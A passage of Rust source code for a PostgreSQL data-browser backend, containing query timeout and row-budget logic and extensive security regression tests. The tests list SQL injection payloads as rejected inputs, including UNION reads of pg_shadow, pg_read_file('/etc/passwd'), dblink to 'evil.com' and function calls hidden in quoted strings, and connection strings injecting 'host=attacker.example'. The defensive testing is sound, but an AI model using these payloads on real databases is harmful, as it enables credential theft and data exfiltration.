        // the future does not stop PostgreSQL: the backend keeps executing and
        // keeps holding its share of the operator's database until it finishes.
        // `statement_timeout` is what actually cancels it. This matters most for
        // the two cheapest ways to build an expensive query here — a filter that
        // forces a sequential scan, and a large OFFSET, whose cost is O(offset)
        // and therefore unaffected by the LIMIT clamp above.
        //
        // Set on the session rather than in a transaction because this client is
        // reused: every later query on this connection inherits the ceiling,
        // which is the behaviour we want for a browser. The value is a u64 we
        // computed, never caller text, so it cannot carry SQL.
        let timeout_ms = options.timeout_ms.unwrap_or(30_000);
        if let Err(e) = client
            .batch_execute(&format!("SET statement_timeout = {timeout_ms}"))
            .await
        {
            // Not fatal on its own — the outer deadline still bounds the
            // request — but it means this query is unbounded server-side, which
            // an operator debugging a slow database needs to be able to see.
            warn!("Failed to set statement_timeout for data browser query: {e}");
        }

        let stream = client
            .query_raw(&sql, std::iter::empty::<&dyn ToSql>())
            .await
            .map_err(|_error| {
                error!(entity = entity_name, limit, "PostgreSQL query failed");
                DataError::BackendQueryFailed {
                    backend: "PostgreSQL",
                    entity: entity_name.to_string(),
                }
            })?;
        pin_mut!(stream);
        let mut bounded = BoundedRows::new(options.budget);
        while let Some(row) = stream.try_next().await.map_err(|_error| {
            error!(entity = entity_name, limit, "PostgreSQL row stream failed");
            DataError::BackendQueryFailed {
                backend: "PostgreSQL",
                entity: entity_name.to_string(),
            }
        })? {
            let observed = row.try_get::<_, i64>("__temps_size").map_err(|_error| {
                error!(
                    entity = entity_name,
                    limit, "PostgreSQL bounded row size decode failed"
                );
                DataError::BackendQueryFailed {
                    backend: "PostgreSQL",
                    entity: entity_name.to_string(),
                }
            })?;
            let observed_cell = row
                .try_get::<_, i64>("__temps_max_cell")
                .map_err(|_error| DataError::BackendQueryFailed {
                    backend: "PostgreSQL",
                    entity: entity_name.to_string(),
                })?;
            let payload = row
                .try_get::<_, Option<serde_json::Value>>("__temps_row")
                .map_err(|_error| {
                    error!(
                        entity = entity_name,
                        limit, "PostgreSQL bounded row decode failed"
                    );
                    DataError::BackendQueryFailed {
                        backend: "PostgreSQL",
                        entity: entity_name.to_string(),
                    }
                })?
                .ok_or_else(|| {
                    let observed_cell = usize::try_from(observed_cell).unwrap_or(usize::MAX);
                    let (limit_kind, limit, observed) =
                        if observed_cell > options.budget.max_cell_bytes {
                            (
                                "wire_cell_bytes",
                                options.budget.max_cell_bytes,
                                observed_cell,
                            )
                        } else {
                            (
                                "wire_row_bytes",
                                options.budget.max_bytes,
                                usize::try_from(observed).unwrap_or(usize::MAX),
                            )
                        };
                    DataError::ResultLimitExceeded {
                        entity: entity_name.to_string(),
                        limit_kind,
                        limit,
                        observed,
                    }
                })?;
            let data_row = match payload {
                serde_json::Value::Object(values) => values.into_iter().collect(),
                _ => {
                    return Err(DataError::SerializationError(format!(
                        "PostgreSQL bounded row for entity '{}' was not an object",
                        entity_name
                    )))
                }
            };
            if !bounded.push(entity_name, data_row)? {
                break;
            }
        }
        let (data_rows, truncated) = bounded.into_parts();

        let execution_ms = start.elapsed().as_millis() as u64;
        let row_count = data_rows.len();

        debug!("Query returned {} rows in {}ms", row_count, execution_ms);

        Ok(QueryResult {
            schema,
            rows: data_rows,
            stats: QueryStats {
                row_count,
                total_rows: None,
                execution_ms,
                has_more: row_count >= limit,
                next_cursor: None,
                truncated,
            },
        })
    }

    async fn count(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
        filters: Option<serde_json::Value>,
    ) -> Result<u64> {
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery(
                "Invalid path depth for count".to_string(),
            ));
        }

        let schema_name = &container_path.segments[1];
        Self::validate_filters(filters.as_ref())?;

        let sql = format!(
            "SELECT COUNT(*) FROM \"{}\".\"{}\"",
            escape_ident(schema_name),
            escape_ident(entity_name)
        );

        let client = &self.client;
        let _timeout_guard = self.query_timeout_lock.lock().await;

        // SECURITY: bound this the same way `query` is bounded.
        //
        // The timeout work originally covered the row-reading path only, which
        // left the more expensive operation unbounded: `COUNT(*)` is a full
        // scan on PostgreSQL, it takes a caller-supplied WHERE clause, and it is
        // reached from `get_entity_info` — an endpoint the AI agent can call.
        // "Check the row count of every table" is then a denial of service
        // against the customer's production database with nothing to stop it.
        if let Err(e) = client
            .batch_execute(&format!(
                "SET statement_timeout = {DEFAULT_COUNT_TIMEOUT_MS}"
            ))
            .await
        {
            warn!("Failed to set statement_timeout for data browser count: {e}");
        }

        let row = client
            .query_one(&sql, &[])
            .await
            .map_err(|e| DataError::QueryFailed(format!("Count query failed: {}", e)))?;

        let count: i64 = row.get(0);
        Ok(count as u64)
    }

    async fn entity_exists(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
    ) -> Result<bool> {
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery("Invalid path depth".to_string()));
        }

        let schema_name = &container_path.segments[1];
        let client = &self.client;

        let query = r#"
            SELECT COUNT(*)
            FROM information_schema.tables
            WHERE table_schema = $1 AND table_name = $2
        "#;

        let row = client
            .query_one(query, &[schema_name, &entity_name])
            .await
            .map_err(|e| DataError::QueryFailed(format!("Entity existence check failed: {}", e)))?;

        let count: i64 = row.get(0);
        Ok(count > 0)
    }
}

#[cfg(test)]
mod wire_budget_tests {
    use super::{with_wire_row_budget, PgQueryColumn};
    use temps_query::QueryBudget;

    #[test]
    fn generated_query_guards_encoded_row_before_wire_transfer() {
        let columns = vec![
            PgQueryColumn {
                name: "bio".to_string(),
                data_type: "text".to_string(),
                udt_kind: Some("b".to_string()),
            },
            PgQueryColumn {
                name: "payload".to_string(),
                data_type: "jsonb".to_string(),
                udt_kind: Some("b".to_string()),
            },
        ];
        let budget = QueryBudget {
            max_bytes: 262_144,
            max_cell_bytes: 65_536,
            ..QueryBudget::default()
        };
        let sql = with_wire_row_budget("SELECT * FROM public.users", &columns, budget)
            .expect("supported schema should build a bounded query");
        assert!(sql.contains("OCTET_LENGTH(__temps_source.\"bio\")::bigint * 6"));
        assert!(sql.contains("PG_COLUMN_COMPRESSION(__temps_source.\"payload\")"));
        assert!(sql.contains("__temps_max_cell <= 65536"));
        assert!(sql.contains("__temps_row_size <= 262144"));
        assert!(sql.contains("THEN TO_JSONB(__temps_source) ELSE NULL"));
        assert!(!sql.contains("TO_JSONB(__temps_source)::text"));
        assert_eq!(sql.matches("TO_JSONB(__temps_source)").count(), 1);
        assert!(sql.contains("SELECT * FROM public.users"));
    }

    #[test]
    fn unknown_types_null_only_the_unsupported_field() {
        let sql = with_wire_row_budget(
            "SELECT * FROM public.widgets",
            &[
                PgQueryColumn {
                    name: "id".to_string(),
                    data_type: "bigint".to_string(),
                    udt_kind: Some("b".to_string()),
                },
                PgQueryColumn {
                    name: "shape".to_string(),
                    data_type: "USER-DEFINED".to_string(),
                    udt_kind: Some("b".to_string()),
                },
            ],
            QueryBudget::default(),
        )
        .expect("an unsupported field must not make the whole relation unqueryable");
        assert!(sql.contains("__temps_raw.\"id\" AS \"id\""));
        assert!(sql.contains("NULL::text AS \"shape\""));
        assert!(!sql.contains("__temps_raw.\"shape\""));
    }

    #[test]
    fn common_builtin_and_enum_types_remain_browsable() {
        for (data_type, udt_kind) in [
            ("inet", Some("b")),
            ("interval", Some("b")),
            ("time with time zone", Some("b")),
            ("bit varying", Some("b")),
            ("USER-DEFINED", Some("e")),
        ] {
            let sql = with_wire_row_budget(
                "SELECT * FROM public.compatibility_types",
                &[PgQueryColumn {
                    name: "value".to_string(),
                    data_type: data_type.to_string(),
                    udt_kind: udt_kind.map(str::to_string),
                }],
                QueryBudget::default(),
            )
            .expect("common bounded PostgreSQL types should remain browsable");
            assert!(sql.contains("TO_JSONB(__temps_source)"));
        }
    }

    #[test]
    fn arrays_use_compression_aware_admission_before_json_generation() {
        for name in [
            "token_tok_live_secret",
            "large_numeric_array",
            "custom_type_array",
        ] {
            let sql = with_wire_row_budget(
                "SELECT * FROM public.array_payloads",
                &[PgQueryColumn {
                    name: name.to_string(),
                    data_type: "ARRAY".to_string(),
                    udt_kind: Some("b".to_string()),
                }],
                QueryBudget::default(),
            )
            .expect("array columns should remain browsable through bounded admission");
            assert!(sql.contains("PG_COLUMN_COMPRESSION"));
            assert!(sql.contains("PG_COLUMN_SIZE"));
            assert_eq!(sql.matches("TO_JSONB(__temps_source)").count(), 1);
        }
    }
}

impl temps_query::QuerySchemaProvider for PostgresSource {
    fn get_filter_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "$schema": "http://json-schema.org/draft-07/schema#",
            "type": "object",
            "title": "PostgreSQL Query Filters",
            "description": "Raw SQL filters are disabled. Use sorting and pagination to browse data safely.",
            "properties": {},
            "additionalProperties": false
        })
    }

    fn get_sort_schema(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
    ) -> Result<serde_json::Value> {
        // Get entity schema to know available fields
        let schema_result = tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current()
                .block_on(async { self.get_schema(container_path, entity_name).await })
        });

        let schema = schema_result?;

        // Build enum of available fields
        let field_names: Vec<String> = schema.fields.iter().map(|f| f.name.clone()).collect();

        Ok(serde_json::json!({
            "$schema": "http://json-schema.org/draft-07/schema#",
            "type": "object",
            "title": "Sort Options",
            "description": "Specify how to sort query results",
            "properties": {
                "sort_by": {
                    "type": "string",
                    "title": "Sort By",
                    "description": "Field to sort by",
                    "enum": field_names,
                    "x-ui-widget": "select"
                },
                "sort_order": {
                    "type": "string",
                    "title": "Sort Order",
                    "description": "Sort direction",
                    "enum": ["asc", "desc"],
                    "default": "asc",
                    "x-ui-widget": "select"
                }
            }
        }))
    }

    fn get_filter_ui_schema(&self) -> Option<serde_json::Value> {
        // No longer needed - UI hints are embedded in filter_schema
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use testcontainers::{
        core::{ContainerPort, WaitFor},
        runners::AsyncRunner,
        GenericImage, ImageExt,
    };

    fn container_runtime_unavailable(error: &str) -> bool {
        let message = error.to_ascii_lowercase();
        [
            "hyper legacy client: client error (connect)",
            "failed to connect to docker",
            "error connecting to docker",
            "docker daemon is unavailable",
            "docker client is unavailable",
            "could not find docker environment",
            "docker socket",
        ]
        .iter()
        .any(|marker| message.contains(marker))
    }

    #[test]
    fn ip_is_private_allows_local_and_mesh_addresses() {
        // These are where a Temps-managed database actually lives: a container
        // on the same host, or a peer on the private mesh. Cleartext there
        // never leaves infrastructure the operator controls, so the fallback
        // must keep working — refusing these would break every existing
        // self-hosted deployment whose Postgres has no TLS.
        for ip in [
            "127.0.0.1",
            "::1",
            "10.0.0.5",
            "172.16.4.9",
            "192.168.1.20",
            "fd00::1",
            "169.254.1.1",
            // Carrier-grade NAT — Tailscale and similar meshes live here.
            "100.64.0.1",
            // IPv4-mapped private address must classify by the embedded v4.
            "::ffff:10.0.0.5",
        ] {
            assert!(
                ip_is_private(ip.parse().expect("test address should parse")),
                "should be treated as private: {ip}"
            );
        }
    }

    #[test]
    fn ip_is_private_rejects_public_addresses() {
        // Falling back to an unverified certificate or to cleartext for these
        // would put the service's admin password on the open internet.
        for ip in [
            "203.0.113.10",
            "8.8.8.8",
            "2606:4700:4700::1111",
            // The integer form of 8.8.8.8 resolves publicly; classifying the
            // *string* used to call it private because it has no dot.
            "::ffff:8.8.8.8",
        ] {
            assert!(
                !ip_is_private(ip.parse().expect("test address should parse")),
                "should NOT be treated as private: {ip}"
            );
        }
    }

    #[tokio::test]
    async fn resolved_host_classifies_the_addresses_that_will_be_dialed() {
        // Loopback and unix sockets stay private...
        for host in ["127.0.0.1", "localhost", "/var/run/postgresql"] {
            assert!(
                resolve_host_once(host, 5432)
                    .await
                    .expect("private test host should resolve")
                    .permits_unverified_transport(),
                "should permit private host: {host}"
            );
        }

        // ...and the numeric-IPv4 forms that defeated string classification are
        // now resolved and rejected. `134744072` == 0x08080808 == 8.8.8.8:
        // `IpAddr::parse` rejects it, so the old "no dot means container name"
        // rule called it private, while getaddrinfo resolves it publicly.
        for host in ["134744072", "0x08080808"] {
            assert!(
                !resolve_host_once(host, 5432)
                    .await
                    .expect("numeric public host should resolve")
                    .permits_unverified_transport(),
                "should reject public host: {host}"
            );
        }

        // Unresolvable is a refusal, not a pass: this decides whether a
        // password may cross the network in cleartext.
        assert!(resolve_host_once("no-such-host.invalid", 5432)
            .await
            .is_err());
        assert!(resolve_host_once("", 5432).await.is_err());
    }

    #[test]
    fn connection_config_pins_every_preapproved_address() {
        let addresses = vec![
            "10.0.0.8".parse().expect("test IPv4 address should parse"),
            "fd00::8".parse().expect("test IPv6 address should parse"),
        ];
        let resolved = ResolvedHost::Tcp {
            hostname: "database.internal".to_string(),
            addresses: addresses.clone(),
        };

        let config = connect_config_for(&resolved, 6432, "admin", "secret", "postgres");

        assert_eq!(config.get_hostaddrs(), addresses.as_slice());
        assert_eq!(config.get_hosts().len(), addresses.len());
        assert!(config.get_hosts().iter().all(|host| {
            matches!(host, tokio_postgres::config::Host::Tcp(name) if name == "database.internal")
        }));
        assert_eq!(config.get_ports(), &[6432]);
    }

    #[test]
    fn connection_config_treats_credentials_as_values_and_requires_tls() {
        let resolved = ResolvedHost::Tcp {
            hostname: "database.internal".to_string(),
            addresses: vec!["10.0.0.8".parse().expect("test IPv4 address should parse")],
        };
        let username = "admin host=attacker.example sslmode=disable";
        let password = "secret dbname=postgres host=attacker.example";
        let database = "postgres sslmode=disable";

        let config = connect_config_for(&resolved, 5432, username, password, database);

        assert_eq!(config.get_user(), Some(username));
        assert_eq!(config.get_password(), Some(password.as_bytes()));
        assert_eq!(config.get_dbname(), Some(database));
        assert_eq!(
            config.get_ssl_mode(),
            tokio_postgres::config::SslMode::Require
        );
        assert_eq!(config.get_hosts().len(), 1);
        assert_eq!(config.get_hostaddrs().len(), 1);
    }

    #[tokio::test]
    async fn private_ladder_rejects_a_public_address_before_connecting() {
        let error = connect_with_private_tls_ladder(
            "203.0.113.10",
            5432,
            "cluster-admin",
            "secret",
            "postgres",
        )
        .await
        .expect_err("a managed-cluster credential must never be sent to a public address");

        assert!(
            error
                .to_string()
                .contains("refusing to send cluster credentials even over verified TLS"),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn validate_sql_rejects_regex_operators() {
        // The pattern lives entirely inside a string literal, so the stripper
        // removes it and every keyword check sees `1=1 and '' ~ ''`. PostgreSQL's
        // regex engine backtracks, so this is catastrophic backtracking — the
        // same CPU burn the function-call guard exists to stop, through a door
        // the guard cannot see.
        assert!(PostgresSource::validate_sql(
            "1=1 AND 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' ~ '^(a+)+$'"
        )
        .is_err());
        assert!(PostgresSource::validate_sql("name !~ 'x'").is_err());
        assert!(PostgresSource::validate_sql("name ~* 'x'").is_err());
    }

    #[test]
    fn validate_sql_rejects_parenless_information_functions() {
        // The function-call guard keys on an identifier before `(`, so
        // niladic-callable functions walk straight past it and give blind
        // boolean extraction through an ordinary filter.
        for clause in [
            "1=1 AND current_user = 'postgres'",
            "1=1 AND current_schema = 'public'",
            "1=1 AND session_user like 'a%'",
            "'pg_shadow'::regclass::text = 'x'",
        ] {
            assert!(
                PostgresSource::validate_sql(clause).is_err(),
                "should have been rejected: {clause}"
            );
        }
    }

    #[test]
    fn validate_sql_still_accepts_columns_containing_keywords() {
        // The denylist used raw substring matching, so any column whose name
        // merely contained a keyword was unfilterable. A validator that blocks
        // legitimate queries is a validator someone eventually switches off.
        for clause in [
            "payload = 'x'",
            "updated_at > '2025-01-01'",
            "deleted_at IS NULL",
            "copy_count > 2",
            "created_by = 'me' AND status = 'active'",
        ] {
            assert!(
                PostgresSource::validate_sql(clause).is_ok(),
                "should have been accepted: {clause}"
            );
        }
    }

    #[test]
    fn contains_sql_token_matches_only_whole_tokens() {
        assert!(contains_sql_token("a union b", "union"));
        assert!(contains_sql_token("union b", "union"));
        assert!(contains_sql_token("a union", "union"));
        // Not a token: embedded in a longer identifier.
        assert!(!contains_sql_token("reunion = 1", "union"));
        assert!(!contains_sql_token("union_id = 1", "union"));
        assert!(!contains_sql_token("payload = 1", "load"));
    }

    #[test]
    fn contains_sql_token_treats_numeric_literals_as_boundaries() {
        // A keyword abutting the tail of a numeric literal is a SEPARATE token
        // to the server's lexer: MySQL and pre-15 PostgreSQL both read
        // `1e0union select ...` as `1e0` followed by `UNION`. Digits are
        // identifier continuation characters but cannot start an identifier, so
        // checking only the single preceding character called this a
        // non-boundary and let the injection through — a regression against the
        // old `contains("union ")` form, which caught it.
        assert!(contains_sql_token("1e0union select 1,2,3", "union"));
        assert!(contains_sql_token("1.0union select 1", "union"));
        assert!(contains_sql_token("0x1union select 1", "union"));
        assert!(contains_sql_token("id=1union select 1", "union"));

        // Still not a match when the run really is an identifier: it starts
        // with a letter or underscore, so the keyword is part of the name.
        assert!(!contains_sql_token("a1union = 1", "union"));
        assert!(!contains_sql_token("_1union = 1", "union"));
        assert!(!contains_sql_token("col2payload = 1", "load"));
    }

    #[test]
    fn validate_sql_rejects_numeric_prefixed_union() {
        // End-to-end form of the above, through the real validator.
        assert!(PostgresSource::validate_sql("1e0union all select 1,2,3").is_err());
        assert!(PostgresSource::validate_sql("id=1.0union select 1").is_err());
    }

    #[test]
    fn test_pg_type_mapping() {
        assert_eq!(PostgresSource::map_pg_type("integer"), FieldType::Int32);
        assert_eq!(PostgresSource::map_pg_type("bigint"), FieldType::Int64);
        assert_eq!(PostgresSource::map_pg_type("text"), FieldType::String);
        assert_eq!(
            PostgresSource::map_pg_type("timestamp"),
            FieldType::Timestamp
        );
        assert_eq!(PostgresSource::map_pg_type("uuid"), FieldType::Uuid);
        assert_eq!(PostgresSource::map_pg_type("jsonb"), FieldType::Json);
    }

    // ── SQL Injection Prevention Tests ────────────────────────────────

    // Helper: assert that a WHERE clause is rejected
    fn assert_sql_rejected(sql: &str) {
        let result = PostgresSource::validate_sql(sql);
        assert!(
            result.is_err(),
            "Expected SQL to be rejected but it was accepted: {:?}",
            sql
        );
    }

    // Helper: assert that a WHERE clause is allowed
    fn assert_sql_allowed(sql: &str) {
        let result = PostgresSource::validate_sql(sql);
        assert!(
            result.is_ok(),
            "Expected SQL to be accepted but it was rejected: {:?} — error: {:?}",
            sql,
            result.unwrap_err()
        );
    }

    // ── Legitimate WHERE clauses that MUST be allowed ────────────────

    #[test]
    fn test_sql_valid_simple_equality() {
        assert_sql_allowed("status = 'active'");
    }

    #[test]
    fn test_sql_valid_comparison_operators() {
        assert_sql_allowed("age >= 18 AND country = 'US'");
        assert_sql_allowed("created_at > '2025-01-01'");
        assert_sql_allowed("price < 100.50");
    }

    #[test]
    fn test_sql_valid_like_pattern() {
        assert_sql_allowed("name LIKE '%test%'");
        assert_sql_allowed("email ILIKE '%@example.com'");
    }

    #[test]
    fn test_sql_valid_in_list() {
        assert_sql_allowed("id IN (1, 2, 3)");
        assert_sql_allowed("status IN ('active', 'pending')");
    }

    #[test]
    fn test_sql_valid_is_null() {
        assert_sql_allowed("deleted_at IS NULL");
        assert_sql_allowed("name IS NOT NULL");
    }

    #[test]
    fn test_sql_valid_between() {
        assert_sql_allowed("created_at BETWEEN '2025-01-01' AND '2025-12-31'");
    }

    #[test]
    fn test_sql_valid_boolean_logic() {
        assert_sql_allowed("active = true AND (role = 'admin' OR role = 'user')");
    }

    // ── SQL Injection attacks that MUST be blocked ───────────────────

    #[test]
    fn test_sql_injection_semicolon_multi_statement() {
        assert_sql_rejected("1=1; DROP TABLE users");
        assert_sql_rejected("status = 'active'; DELETE FROM sessions");
    }

    #[test]
    fn test_sql_injection_union_select_data_exfiltration() {
        assert_sql_rejected("1=1 UNION SELECT * FROM users");
        assert_sql_rejected("1=1 union select password from users");
        assert_sql_rejected("id = 1 UNION\tSELECT * FROM secrets");
    }

    #[test]
    fn test_sql_injection_union_with_exotic_whitespace() {
        // The denylist used to enumerate separators literally ("union ",
        // "union\t", "union\n"), so any other whitespace PostgreSQL's lexer
        // accepts walked straight past it — no semicolon, no parenthesis, so
        // every structural check passed too. This was full arbitrary-table
        // exfiltration through a documented filter parameter.
        assert_sql_rejected("false UNION\rSELECT usename, passwd FROM pg_shadow");
        assert_sql_rejected("false UNION\u{000C}SELECT usename FROM pg_shadow");
        assert_sql_rejected("false UNION\u{000B}SELECT usename FROM pg_shadow");
        // Mixed and repeated separators must collapse to one too.
        assert_sql_rejected("false UNION \r\n\t SELECT usename FROM pg_shadow");
        assert_sql_rejected("1=1 INTERSECT\rSELECT 1");
        assert_sql_rejected("1=1 EXCEPT\rSELECT 1");
    }

    #[test]
    fn validate_sort_field_does_not_panic_on_a_lone_quote() {
        // `"` satisfies both starts_with('"') and ends_with('"'), so the
        // quoted-identifier branch sliced &s[1..0] and panicked. Reachable via
        // ?sort_by=%22 with only ExternalServicesRead, and via the agent's
        // --sort_by flag, which makes it prompt-injectable.
        assert!(PostgresSource::validate_sort_field("\"").is_err());
        assert!(PostgresSource::validate_sort_field("\"\"").is_err());
        // Ordinary identifiers, quoted and bare, still validate.
        assert!(PostgresSource::validate_sort_field("\"created_at\"").is_ok());
        assert!(PostgresSource::validate_sort_field("created_at").is_ok());
    }

    #[test]
    fn normalize_sql_whitespace_collapses_every_separator() {
        assert_eq!(normalize_sql_whitespace("a\rb"), "a b");
        assert_eq!(normalize_sql_whitespace("a\u{000C}b"), "a b");
        assert_eq!(normalize_sql_whitespace("a \r\n\t b"), "a b");
        // Non-whitespace is untouched, so ordinary clauses still validate.
        assert_eq!(normalize_sql_whitespace("id = 1"), "id = 1");
    }

    #[test]
    fn test_sql_injection_subquery_in_where() {
        assert_sql_rejected("id = (SELECT id FROM users LIMIT 1)");
        assert_sql_rejected("name = (select password from users limit 1)");
    }

    #[test]
    fn test_sql_injection_exists_subquery() {
        // EXISTS with subquery should be blocked by the subquery detection
        assert_sql_rejected("EXISTS (SELECT 1 FROM users WHERE admin = true)");
    }

    #[test]
    fn test_sql_injection_in_subquery() {
        assert_sql_rejected("id IN (SELECT user_id FROM admin_users)");
    }

    #[test]
    fn test_sql_injection_alternate_query_expression_subqueries() {
        assert_sql_rejected("7 IN (TABLE private_ids)");
        assert_sql_rejected("7 in (\nTaBlE\tprivate_ids)");
        assert_sql_rejected("7 IN ((TABLE private_ids))");
        assert_sql_rejected("7 IN (VALUES (7))");
        assert_sql_rejected("7 IN (WITH ids AS (TABLE private_ids) TABLE ids)");

        // Token boundaries must not reject ordinary identifiers that merely
        // contain a query-expression keyword.
        assert_sql_allowed("selected_id IN (1, 2)");
        assert_sql_allowed("\"table\" IN (1, 2)");
    }

    #[test]
    fn test_sql_injection_drop_table() {
        assert_sql_rejected("1=1; DROP TABLE users");
        assert_sql_rejected("drop table users");
    }

    #[test]
    fn test_sql_injection_truncate() {
        assert_sql_rejected("1=1; truncate table sessions");
    }

    #[test]
    fn test_sql_injection_alter_table() {
        assert_sql_rejected("alter table users add column backdoor text");
    }

    #[test]
    fn test_sql_injection_create() {
        assert_sql_rejected("1=1; create table evil (data text)");
    }

    #[test]
    fn test_sql_injection_grant_revoke() {
        assert_sql_rejected("grant all on users to evil");
        assert_sql_rejected("revoke select on users from public");
    }

    #[test]
    fn test_sql_injection_insert_update_delete() {
        assert_sql_rejected("1=1; insert into users (email) values ('evil@hack.com')");
        assert_sql_rejected("1=1; update users set role = 'admin'");
        assert_sql_rejected("1=1; delete from sessions");
    }

    #[test]
    fn test_sql_injection_pg_sleep_timing_attack() {
        assert_sql_rejected("pg_sleep(10)");
        assert_sql_rejected("1=1 AND pg_sleep(5) IS NOT NULL");
    }

    #[test]
    fn test_sql_injection_pg_file_read() {
        assert_sql_rejected("pg_read_file('/etc/passwd')");
        assert_sql_rejected("pg_read_binary_file('/etc/shadow')");
        assert_sql_rejected("pg_write_file('/tmp/evil', 'data')");
    }

    #[test]
    fn test_sql_injection_pg_ls_dir() {
        assert_sql_rejected("pg_ls_dir('/etc')");
        assert_sql_rejected("pg_ls_logdir()");
        assert_sql_rejected("pg_ls_waldir()");
    }

    #[test]
    fn test_sql_injection_lo_import_export() {
        assert_sql_rejected("lo_import('/etc/passwd')");
        assert_sql_rejected("lo_export(1234, '/tmp/data')");
    }

    #[test]
    fn test_sql_injection_terminate_backend() {
        assert_sql_rejected("pg_terminate_backend(1234)");
        assert_sql_rejected("pg_cancel_backend(1234)");
    }

    #[test]
    fn test_sql_injection_dblink() {
        assert_sql_rejected("dblink('host=evil.com', 'SELECT * FROM users')");
        assert_sql_rejected("dblink_connect('evil_conn', 'host=evil.com')");
        assert_sql_rejected("dblink_exec('evil_conn', 'DROP TABLE users')");
    }

    #[test]
    fn test_sql_injection_set_config() {
        assert_sql_rejected("set_config('log_statement', 'all', false)");
    }

    // Regression for security review finding #4: data-returning functions carry
    // their SQL payload inside a string literal, which is stripped before the
    // denylist runs — so these were NOT on the denylist and slipped through.
    // The structural "no function calls" rule blocks the whole class.
    #[test]
    fn test_sql_injection_xml_function_exfiltration() {
        assert_sql_rejected(
            "1=1 AND query_to_xml('select * from users', true, false, '') IS NOT NULL",
        );
        assert_sql_rejected("database_to_xml(true, false, '') IS NOT NULL");
        assert_sql_rejected("table_to_xml('users', true, false, '') IS NOT NULL");
    }

    #[test]
    fn test_escape_string_cannot_hide_function_call() {
        assert_sql_rejected(
            r"E'x\'' IS NOT NULL AND query_to_xml('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%'",
        );
        assert_sql_allowed(r"name = E'O\'Brien'");
        assert_sql_rejected(r"name = 'O\'Brien'");
        assert_sql_rejected("name = 'unterminated");
    }

    #[test]
    fn test_dollar_quoted_string_cannot_hide_function_call() {
        assert_sql_rejected(
            "$tag$'$tag$ IS NOT NULL AND query_to_xml('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%' AND $tail$'$tail$ IS NOT NULL",
        );
        assert_sql_allowed("name = $$O'Brien$$");
        assert_sql_allowed("name = $person$O'Brien$person$");
        assert_sql_allowed("name = $Tag$O'Brien$Tag$");
        assert_sql_rejected("name = $Tag$O'Brien$tag$");
        assert_sql_allowed("name = $💣$O'Brien$💣$");
        assert_sql_rejected("name = $💣$unterminated");
        assert_sql_allowed("identifier$tag$ = 1");
        assert_sql_rejected("name = $person$unterminated");
    }

    #[test]
    fn test_quoted_identifier_cannot_hide_function_call() {
        assert_sql_rejected(
            "\"'\" IS NOT NULL AND query_to_xml('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%' AND \"'\" IS NOT NULL",
        );
        assert_sql_allowed("\"O'Brien\" = 1");
        assert_sql_allowed("U&\"O\\0027Brien\" = 1");
        assert_sql_allowed("\"contains \"\"quote\"\"\" = 1");
        assert_sql_rejected("\"unterminated = 1");
    }

    #[test]
    fn test_sql_injection_quoted_function_identifier_exfiltration() {
        // PostgreSQL allows function identifiers to be quoted and optionally
        // schema-qualified. The closing quote must still be recognized as a
        // function-call prefix.
        assert_sql_rejected(
            "1=1 AND \"query_to_xml\"('select * from users', true, false, '') IS NOT NULL",
        );
        assert_sql_rejected(
            "pg_catalog.\"query_to_xml\"('select * from users', true, false, '') IS NOT NULL",
        );
        assert_sql_rejected(
            "\"pg_catalog\".\"query_to_xml\"('select * from users', true, false, '') IS NOT NULL",
        );
        assert_sql_rejected(
            "U&\"query_to_xml\" UESCAPE '!'('select * from users', true, false, '') IS NOT NULL",
        );
        assert_sql_rejected(
            "pg_catalog.U&\"query_to_xml\" UESCAPE '!'('select * from users', true, false, '') IS NOT NULL",
        );
        assert_sql_rejected("\"length\"(password) > 0");
    }

    #[test]
    fn test_sql_injection_postgres_identifier_characters_before_call() {
        // PostgreSQL accepts `$` and non-ASCII bytes after the first identifier
        // character. They must not turn the extracted prefix into an empty or
        // partial identifier.
        assert_sql_rejected("evil$function(secret) IS NOT NULL");
        assert_sql_rejected("fünction(secret) IS NOT NULL");
    }

    #[test]
    fn test_sql_injection_qualified_grouping_keyword_function_calls() {
        // These final identifiers are allowed only as SQL grouping keywords.
        // Once schema-qualified, PostgreSQL parses them as function names.
        assert_sql_rejected("public.in()");
        assert_sql_rejected("public.and()");
        assert_sql_rejected("public.or()");
        assert_sql_rejected("public.not()");
        assert_sql_rejected("public . in ()");
    }

    #[test]
    fn test_filter_placeholder_obeys_no_function_call_contract() {
        assert_sql_allowed(FILTER_WHERE_PLACEHOLDER);
        assert_sql_rejected("created_at > NOW() - INTERVAL '7 days'");
    }

    #[tokio::test]
    async fn verified_tls_rung_refuses_a_server_that_does_not_offer_tls() {
        // THE regression test for the inert TLS ladder.
        //
        // tokio-postgres defaults to `SslMode::Prefer`, under which
        // `connect_tls` returns `Ok(MaybeTlsStream::Raw)` — an ordinary
        // cleartext socket — when the server answers anything but `S` to the
        // SSLRequest. So the "verified TLS" rung used to SUCCEED against a
        // plaintext server, log that it had connected with verified TLS, and
        // leave the two lower rungs (and with them the `host_is_private`
        // cleartext guard) unreachable. An on-path attacker forced that by
        // answering `N`: an SSL-strip requiring no certificate.
        //
        // The stock `postgres` image ships with SSL off, so it answers `N` —
        // exactly the shape of the attack. Rung 1 must now fail here. No unit
        // test can show this: it is a property of the wire handshake.
        let container = match GenericImage::new("postgres", "18-alpine")
            .with_exposed_port(ContainerPort::Tcp(5432))
            .with_wait_for(WaitFor::message_on_stderr(
                "database system is ready to accept connections",
            ))
            .with_env_var("POSTGRES_DB", "postgres")
            .with_env_var("POSTGRES_USER", "postgres")
            .with_env_var("POSTGRES_HOST_AUTH_METHOD", "trust")
            .start()
            .await
        {
            Ok(container) => container,
            Err(error) => {
                eprintln!("Docker unavailable; skipping PostgreSQL TLS regression test: {error}");
                return;
            }
        };

        let host = container
            .get_host()
            .await
            .expect("started PostgreSQL container must expose its host")
            .to_string();
        let port = container
            .get_host_port_ipv4(5432)
            .await
            .expect("started PostgreSQL container must expose port 5432");

        // Build the config the way `PostgresSource::connect` does, by calling
